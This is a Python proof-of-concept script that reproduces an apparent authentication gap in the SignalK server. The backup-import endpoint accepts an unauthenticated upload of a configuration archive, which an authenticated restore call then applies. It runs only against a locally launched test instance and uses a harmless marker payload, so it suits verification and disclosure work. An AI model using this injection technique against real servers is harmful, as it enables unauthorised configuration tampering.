#!/usr/bin/env python3
"""
PoC for SignalK server configuration injection via unauthenticated backup import.

The /skServer/validateBackup endpoint (import) is NOT behind admin auth middleware,
while /skServer/restore (apply) IS. This lets an attacker upload a malicious
configuration archive without credentials, then apply it with a legitimately
obtained admin session.

Usage:
    python3 poc.py --binary /path/to/signalk-server [--json-out out.json] [--timeout 90]
"""

import argparse
import json
import os
import random
import shutil
import signal as sig_module
import string
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from io import BytesIO


# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------

def find_free_port():
    """Return a free TCP port on 127.0.0.1."""
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def random_string(length=12):
    """Return a random alphanumeric string."""
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def generate_marker():
    """Return a unique marker that will be embedded in the payload."""
    return "POC_INJECT_" + random_string(16)


def http_request(method, url, data=None, headers_in=None, timeout=10):
    """Make an HTTP request and return (status, body_bytes, headers_dict)."""
    headers = {}
    if headers_in:
        headers.update(headers_in)
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read(), dict(resp.info())
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(), dict(exc.info())
    except urllib.error.URLError as exc:
        raise RuntimeError(f"Request to {url} failed: {exc.reason}") from exc


def build_multipart_body(boundary, field_name, filename, payload):
    """Build a multipart/form-data body for a single file field."""
    parts = BytesIO()
    parts.write(
        (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field_name}"; '
            f'filename="{filename}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
        ).encode("utf-8")
    )
    parts.write(payload)
    parts.write(f"\r\n--{boundary}--\r\n".encode("utf-8"))
    return parts.getvalue()


def build_backup_zip(marker):
    """Build a ZIP (in-memory) containing a malicious defaults.json."""
    buf = BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        payload = json.dumps(
            {
                "marker": marker,
                "injected": True,
                "description": "PoC configuration injection test",
            }
        )
        zf.writestr("defaults.json", payload)
    return buf.getvalue()


# ---------------------------------------------------------------------------
# Server lifecycle
# ---------------------------------------------------------------------------

class ServerRunner:
    """Start, probe, and stop the target server binary."""

    def __init__(self, binary, timeout=90):
        self.binary = os.path.abspath(binary)
        self.bin_dir = os.path.dirname(self.binary)
        self.timeout = timeout
        self.port = find_free_port()
        self.username = "admin_" + random_string(8)
        self.password = random_string(20)
        self.admin_user = f"{self.username}:{self.password}"
        self.config_dir = tempfile.mkdtemp(prefix="signalk_config_")
        self.proc = None
        self.start_time = 0.0
        self.base_url = f"http://127.0.0.1:{self.port}"

    def start(self):
        """Launch the server with controlled environment."""
        self.start_time = time.time()
        env = os.environ.copy()
        env["PORT"] = str(self.port)
        env["ADMINUSER"] = self.admin_user
        env["SIGNALK_NODE_CONFIG_DIR"] = self.config_dir

        self.proc = subprocess.Popen(
            [self.binary],
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=self.bin_dir,
            start_new_session=True,
        )

    def wait_ready(self):
        """Poll the server until it responds on HTTP, or time out."""
        deadline = self.start_time + self.timeout
        while time.time() < deadline:
            if self.proc.poll() is not None:
                return False  # process exited
            try:
                _, _, _ = http_request("GET", f"{self.base_url}/", timeout=2)
                return True
            except Exception:
                time.sleep(0.5)
        return False  # timed out

    def login(self):
        """Authenticate with the admin credentials and return the session token."""
        body = json.dumps(
            {"username": self.username, "password": self.password}
        ).encode("utf-8")
        status, resp_body, resp_headers = http_request(
            "POST",
            f"{self.base_url}/login",
            data=body,
            headers_in={"Content-Type": "application/json"},
        )
        if status != 200:
            return None
        try:
            data = json.loads(resp_body)
        except (json.JSONDecodeError, ValueError):
            return None
        token = data.get("token")
        # Fallback: extract from Set-Cookie header
        if not token:
            set_cookie = resp_headers.get("Set-Cookie", "")
            for part in set_cookie.split(";"):
                part = part.strip()
                if part.startswith("JAUTHENTICATION="):
                    token = part[len("JAUTHENTICATION="):]
                    break
        return token

    def stop(self):
        """Terminate the server process and clean up the temp directory."""
        if self.proc and self.proc.pid:
            try:
                os.killpg(os.getpgid(self.proc.pid), sig_module.SIGTERM)
                self.proc.wait(timeout=10)
            except Exception:
                try:
                    os.killpg(os.getpgid(self.proc.pid), sig_module.SIGKILL)
                    self.proc.wait(timeout=5)
                except Exception:
                    pass
        if self.config_dir:
            shutil.rmtree(self.config_dir, ignore_errors=True)

    def collect_output(self):
        """Read and return (stdout, stderr) from the finished process."""
        out = err = ""
        if self.proc:
            try:
                out = self.proc.stdout.read().decode("utf-8", errors="replace") if self.proc.stdout else ""
            except Exception:
                pass
            try:
                err = self.proc.stderr.read().decode("utf-8", errors="replace") if self.proc.stderr else ""
            except Exception:
                pass
        # Truncate long output
        MAX_OUT = 100_000
        if len(out) > MAX_OUT:
            out = out[:MAX_OUT] + "\n[...truncated...]"
        if len(err) > MAX_OUT:
            err = err[:MAX_OUT] + "\n[...truncated...]"
        return out, err

    def get_returncode(self):
        if self.proc and self.proc.returncode is not None:
            return self.proc.returncode
        return None

    def get_signal_name(self):
        """Return the OS signal name if the process was killed by a signal."""
        if self.proc and self.proc.returncode is not None and self.proc.returncode < 0:
            try:
                import signal as _sig
                return _sig.Signals(-self.proc.returncode).name
            except (ValueError, AttributeError):
                return f"SIGNAL_{-self.proc.returncode}"
        return None


# ---------------------------------------------------------------------------
# Main PoC logic
# ---------------------------------------------------------------------------

def run_poc(binary, timeout=90):
    """Execute the full PoC and return the structured result dict."""
    runner = ServerRunner(binary, timeout)
    marker = generate_marker()
    result = {
        "binary": os.path.abspath(binary),
        "command": [os.path.abspath(binary)],
        "returncode": -1,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {
            "kind": "custom",
            "value": json.dumps({
                "triggered": False,
                "import_http": 0,
                "apply_http": 0,
                "config_replaced": False,
                "marker": marker,
                "config_content": None,
                "server_log_tail": "",
            }),
            "path": None,
        },
        "error": None,
    }

    try:
        # --- Start server ---
        runner.start()
        ready = runner.wait_ready()
        if not ready:
            elapsed = time.time() - runner.start_time
            if runner.proc and runner.proc.poll() is not None:
                result["error"] = "Server process exited before becoming ready"
            else:
                result["timed_out"] = True
                result["error"] = "Server did not become ready within timeout"
            result["runtime_ms"] = int(elapsed * 1000)
            out, err = runner.collect_output()
            result["stdout"] = out
            result["stderr"] = err
            rc = runner.get_returncode()
            if rc is not None:
                result["returncode"] = rc
            return result

        # --- Login to get a session token ---
        token = runner.login()
        if token is None:
            elapsed = time.time() - runner.start_time
            result["error"] = "Login failed"
            result["runtime_ms"] = int(elapsed * 1000)
            out, err = runner.collect_output()
            result["stdout"] = out
            result["stderr"] = err
            rc = runner.get_returncode()
            if rc is not None:
                result["returncode"] = rc
            return result

        # --- Build the malicious backup archive ---
        zip_data = build_backup_zip(marker)
        backup_filename = f"signalk-{int(time.time())}.backup"

        # --- Step 1: Import the configuration archive (UNAUTHENTICATED) ---
        boundary = "----Boundary" + random_string(20)
        multipart_body = build_multipart_body(
            boundary, "file", backup_filename, zip_data
        )
        import_status, import_body, import_headers = http_request(
            "POST",
            f"{runner.base_url}/skServer/validateBackup",
            data=multipart_body,
            headers_in={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )

        # --- Step 2: Apply the configuration (AUTHENTICATED) ---
        apply_status = 0
        if import_status in (200, 202):
            # The restore endpoint expects URL-encoded body with file names as keys
            apply_body = urllib.parse.urlencode({"defaults.json": "true"}).encode("ascii")
            apply_status, apply_body, _ = http_request(
                "POST",
                f"{runner.base_url}/skServer/restore",
                data=apply_body,
                headers_in={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": f"JAUTHENTICATION={token}",
                    "Authorization": f"Bearer {token}",
                },
            )

        # --- Wait for async restore to complete ---
        if apply_status in (200, 202):
            time.sleep(2)

        # --- Check for evidence in config directory ---
        config_replaced = False
        config_content = None
        for root, _dirs, files in os.walk(runner.config_dir):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "rb") as f:
                        content = f.read()
                    if marker.encode() in content:
                        config_replaced = True
                        config_content = content.decode("utf-8", errors="replace")
                        break
                except Exception:
                    pass
            if config_replaced:
                break

        # --- Stop the server and collect output ---
        runner.stop()
        elapsed = time.time() - runner.start_time
        out, err = runner.collect_output()
        rc = runner.get_returncode()

        # Collect server log tail (last 100 lines of stderr)
        log_lines = err.split("\n")
        server_log_tail = "\n".join(log_lines[-100:])

        observable = {
            "triggered": config_replaced,
            "import_http": import_status,
            "apply_http": apply_status,
            "config_replaced": config_replaced,
            "marker": marker,
            "config_content": config_content,
            "server_log_tail": server_log_tail,
        }

        result["returncode"] = rc if rc is not None else -1
        result["signal"] = runner.get_signal_name()
        result["runtime_ms"] = int(elapsed * 1000)
        result["stdout"] = out
        result["stderr"] = err
        result["observable"]["value"] = json.dumps(observable)
        result["observable"]["kind"] = "custom"
        result["observable"]["path"] = None
        result["error"] = None

        return result

    except Exception as exc:
        # Script-level failure — record as error, not as a rejected interaction
        elapsed = time.time() - runner.start_time
        runner.stop()
        out, err = runner.collect_output()
        rc = runner.get_returncode()
        result["returncode"] = rc if rc is not None else -1
        result["signal"] = runner.get_signal_name()
        result["runtime_ms"] = int(elapsed * 1000)
        result["stdout"] = out
        result["stderr"] = err
        result["timed_out"] = False
        result["observable"]["path"] = None
        result["error"] = f"{type(exc).__name__}: {exc}"
        return result


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="SignalK server configuration injection PoC"
    )
    parser.add_argument(
        "--binary",
        required=True,
        help="Path to the target server binary",
    )
    parser.add_argument(
        "--json-out",
        help="Write JSON result to this file instead of stdout",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=90,
        help="Overall per-run budget in seconds (default 90)",
    )
    return parser.parse_args(argv)


def main():
    args = parse_args()
    binary = args.binary
    timeout = args.timeout

    if not os.path.isfile(binary):
        print(f"Error: binary not found: {binary}", file=sys.stderr)
        sys.exit(1)

    result = run_poc(binary, timeout)

    output = json.dumps(result, indent=2, ensure_ascii=False)
    if args.json_out:
        out_dir = os.path.dirname(args.json_out)
        if out_dir:
            os.makedirs(out_dir, exist_ok=True)
        with open(args.json_out, "w") as f:
            f.write(output)
        print(f"Result written to {args.json_out}")
    else:
        print(output)


if __name__ == "__main__":
    main()